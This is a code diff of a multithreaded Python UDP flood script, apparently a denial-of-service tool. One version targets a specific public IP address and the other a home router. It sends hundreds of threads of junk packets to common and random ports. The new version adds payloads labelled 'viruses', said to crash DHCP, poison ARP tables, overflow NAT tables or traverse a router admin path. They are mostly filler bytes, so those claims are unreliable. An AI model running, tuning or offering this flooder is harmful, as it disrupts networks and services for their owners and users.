@@ -2,133 +2,226 @@ import socket
 import threading
 import time
 import random
+import struct
 
-TARGET_IP = "62.109.121.42"
+TARGET_IP = "192.168.1.1"  # YOUR ROUTER
 
-# EFFICIENT 500 THREADS
-UDP_RAPID_PPS = 125    # Fast small
-UDP_PPS = 125          # Regular PPS  
-UDP_RAPID_BW = 125     # Fast large
-UDP_BW = 125           # Regular bandwidth
-TOTAL_THREADS = 500
+# ==================== STS VIRUS HEADERS ====================
+PPS_VIRUSES = [
+    # STS Strike Team Sierra Rapid PPS
+    b'STS-RAPID\x00' + random.randbytes(56),
+    
+    # STARSHIP PPS Virus
+    b'STARSHIP-PPS\x00' + b'\xDE\xAD' * 26,
+    
+    # ZAP-DEAD PPS Header
+    b'ZAP-DEAD***.★★.★\x00' + b'\xFF\x00' * 22,
+    
+    # 💥STS💥 PPS Marker
+    b'\xE2\x9A\xA0STS\xE2\x9A\xA0' + b'\xCC' * 56,
+    
+    # Sierra Team Signature
+    b'SIERRA-TEAM\x00' + b'\xAA\x55' * 26,
+]
 
-# Colors
-YELLOW = '\033[93m'
-GREEN = '\033[92m'
-RED = '\033[91m'
-WHITE = '\033[97m'
-RESET = '\033[0m'
+BW_VIRUSES = [
+    # STS Bandwidth Nuke (1024 bytes)
+    b'STS-BW-NUKE\x00' + b'\x00' * 512 + b'\xFF' * 500,
+    
+    # STARSHIP Bandwidth Destroyer
+    b'STARSHIP-BW\x00' + b'\xDE\xAD\xBE\xEF' * 250,
+    
+    # ZAP-DEAD Bandwidth Killer  
+    b'ZAP-DEAD-BW***\x00' + b'\xCA\xFE\xBA\xBE' * 250,
+    
+    # 💥STS💥 Maximum Bandwidth
+    b'\xE2\x9A\xA0STS-BW\xE2\x9A\xA0' + random.randbytes(1000),
+    
+    # Sierra Team Bandwidth Bomb
+    b'SIERRA-BANDWIDTH\x00' + bytes([i % 256 for i in range(1000)]),
+]
 
-# Optimized socket pools
-socket_pools = {}
-def get_socket(thread_type):
-    if thread_type not in socket_pools:
-        socket_pools[thread_type] = []
-        for _ in range(25):
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
-                socket_pools[thread_type].append(sock)
-            except:
-                pass
-    if socket_pools[thread_type]:
-        return random.choice(socket_pools[thread_type])
-    return socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+ROUTER_KILL_VIRUSES = [
+    # DHCP Server Crash
+    b'STS-DHCP\x00\x01\x01\x06\x00' + b'\xFF' * 300,
+    
+    # ARP Table Poison
+    b'STARSHIP-ARP\x00\xff\xff\xff\xff\xff\xff' + b'\x00' * 100,
+    
+    # NAT Table Overflow
+    b'ZAP-NAT\x00' + bytes([random.randint(1, 254) for _ in range(500)]),
+    
+    # WiFi Driver Crash
+    b'💥WIFI\x00\x08\x00' + b'\xAA' * 500,
+    
+    # Router Admin Panel Crash
+    b'SIERRA-ADMIN\x00GET /admin/' + b'../' * 100,
+]
 
-# Counters
+# ==================== VIRUS GENERATORS ====================
+def gen_pps_virus():
+    virus = random.choice(PPS_VIRUSES)
+    # Add corrupt body
+    body = bytes([random.randint(0, 255) for _ in range(64 - len(virus))])
+    return virus + body
+
+def gen_bw_virus():
+    virus = random.choice(BW_VIRUSES)
+    # Large corrupt body
+    body = bytes([random.choice([0x00, 0xFF, 0x80, 0x7F]) for _ in range(1024 - len(virus))])
+    return virus + body
+
+def gen_kill_virus():
+    virus = random.choice(ROUTER_KILL_VIRUSES)
+    # Maximum corruption
+    body = b'\xCC' * (1472 - len(virus))
+    return virus + body
+
+# ==================== THREAD CONFIG ====================
+UDP_RAPID_PPS = 150    # Fast small virus packets
+UDP_PPS = 150          # Regular PPS virus packets
+UDP_RAPID_BW = 150     # Fast large virus packets  
+UDP_BW = 150           # Regular bandwidth virus packets
+TOTAL_THREADS = 600
+
+# Global counters
 total_packets = 0
 total_bytes = 0
 
-# ==================== EFFICIENT ATTACK METHODS ====================
-def efficient_udp_rapid_pps(thread_id):
+# ==================== UDP RAPID PPS VIRUS ====================
+def udp_rapid_pps_virus(thread_id):
     global total_packets, total_bytes
     
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # Critical router ports
+    ROUTER_PORTS = [53, 80, 443, 23, 21, 22, 25, 67, 68, 161, 162, 123, 1900, 7547]
+    
     while True:
-        sock = get_socket("rapid_pps")
         try:
-            # OPTIMIZED: Batch send to same port
-            payload = random.randbytes(64)
-            for port in [53, 80, 443]:
-                # Send 8 packets per port for efficiency
-                for _ in range(8):
-                    sock.sendto(payload, (TARGET_IP, port))
+            # MAXIMUM SPEED - STS VIRUS PACKETS
+            for _ in range(30):  # 30 virus packets per loop
+                virus = gen_pps_virus()
+                
+                # RAPID FIRE to all router ports
+                for port in ROUTER_PORTS:
+                    sock.sendto(virus, (TARGET_IP, port))
                     total_packets += 1
-                    total_bytes += 64
+                    total_bytes += len(virus)
+                    
         except:
-            pass
+            try:
+                sock.close()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            except:
+                pass
 
-def efficient_udp_pps(thread_id):
+# ==================== UDP PPS VIRUS ====================
+def udp_pps_virus(thread_id):
     global total_packets, total_bytes
     
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
     while True:
-        sock = get_socket("pps")
         try:
-            # OPTIMIZED: Multiple sizes, targeted ports
-            sizes = [96, 128, 160]
+            # Regular PPS - STS virus packets
+            for _ in range(20):
+                virus = gen_pps_virus()
+                
+                # Attack range of ports with virus
+                for _ in range(10):
+                    port = random.randint(1, 65535)
+                    sock.sendto(virus, (TARGET_IP, port))
+                    total_packets += 1
+                    total_bytes += len(virus)
+                    
+        except:
+            try:
+                sock.close()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            except:
+                pass
+
+# ==================== UDP RAPID BANDWIDTH VIRUS ====================
+def udp_rapid_bw_virus(thread_id):
+    global total_packets, total_bytes
+    
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    # Router bandwidth ports
+    BW_PORTS = [80, 443, 8080, 8443, 7547]
+    
+    while True:
+        try:
+            # Fast bandwidth - Large STS viruses
             for _ in range(12):
-                size = random.choice(sizes)
-                payload = random.randbytes(size)
-                port = random.choice([80, 443, 22, 21, 25, 53, 123])
-                sock.sendto(payload, (TARGET_IP, port))
-                total_packets += 1
-                total_bytes += size
+                virus = gen_bw_virus()
+                
+                # Hammer bandwidth ports with viruses
+                for port in BW_PORTS:
+                    sock.sendto(virus, (TARGET_IP, port))
+                    total_packets += 1
+                    total_bytes += len(virus)
+                    
         except:
-            pass
+            try:
+                sock.close()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            except:
+                pass
 
-def efficient_udp_rapid_bw(thread_id):
+# ==================== UDP BANDWIDTH VIRUS ====================
+def udp_bandwidth_virus(thread_id):
     global total_packets, total_bytes
     
-    while True:
-        sock = get_socket("rapid_bw")
-        try:
-            # OPTIMIZED: Larger packets, fewer sends
-            payload = random.randbytes(1024)
-            # Hit same port multiple times (more efficient)
-            for _ in range(6):
-                sock.sendto(payload, (TARGET_IP, 80))
-                sock.sendto(payload, (TARGET_IP, 443))
-                total_packets += 2
-                total_bytes += 2048
-        except:
-            pass
-
-def efficient_udp_bw(thread_id):
-    global total_packets, total_bytes
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
-        sock = get_socket("bw")
         try:
-            # OPTIMIZED: MAX size, strategic ports
-            payload = random.randbytes(1472)
-            for port in [80, 443, 8080, 8443, 7547]:
-                sock.sendto(payload, (TARGET_IP, port))
-                total_packets += 1
-                total_bytes += 1472
+            # Maximum bandwidth - Router kill viruses
+            for _ in range(8):
+                virus = gen_kill_virus()
+                
+                # Saturate all ports with kill viruses
+                for _ in range(8):
+                    port = random.randint(1, 65535)
+                    sock.sendto(virus, (TARGET_IP, port))
+                    total_packets += 1
+                    total_bytes += len(virus)
+                    
         except:
-            pass
+            try:
+                sock.close()
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            except:
+                pass
 
-# ==================== LAUNCH 500 EFFICIENT THREADS ====================
+# ==================== LAUNCH ALL 600 VIRUS THREADS ====================
+# Start UDP Rapid PPS Virus
 for i in range(UDP_RAPID_PPS):
-    t = threading.Thread(target=efficient_udp_rapid_pps, args=(i,))
+    t = threading.Thread(target=udp_rapid_pps_virus, args=(i,))
     t.daemon = True
     t.start()
 
+# Start UDP PPS Virus
 for i in range(UDP_PPS):
-    t = threading.Thread(target=efficient_udp_pps, args=(i,))
+    t = threading.Thread(target=udp_pps_virus, args=(i,))
     t.daemon = True
     t.start()
 
+# Start UDP Rapid Bandwidth Virus
 for i in range(UDP_RAPID_BW):
-    t = threading.Thread(target=efficient_udp_rapid_bw, args=(i,))
+    t = threading.Thread(target=udp_rapid_bw_virus, args=(i,))
     t.daemon = True
     t.start()
 
+# Start UDP Bandwidth Virus
 for i in range(UDP_BW):
-    t = threading.Thread(target=efficient_udp_bw, args=(i,))
+    t = threading.Thread(target=udp_bandwidth_virus, args=(i,))
     t.daemon = True
     t.start()
 
-# ==================== COLORED LOGGING ====================
+# ==================== LOGGING ONLY ====================
 last_log = time.time()
 
 while True:
@@ -145,13 +238,5 @@ while True:
     total_packets = 0
     total_bytes = 0
     
-    # Color coding
-    if mbps >= 100:
-        bw_color = GREEN
-    elif mbps >= 50:
-        bw_color = WHITE
-    else:
-        bw_color = RED
-    
-    # Display
-    print(f"{YELLOW}SK1-SSALG{RESET} | {GREEN}{pps:,}/s{RESET} | {bw_color}{mbps:.1f}Mbps{RESET}")
+    # SK1-SSALG LOGGING ONLY - STS VIRUS EDITION
+    print(f"SK1-SSALG | {pps:,}/s | {mbps:.1f}Mbps")
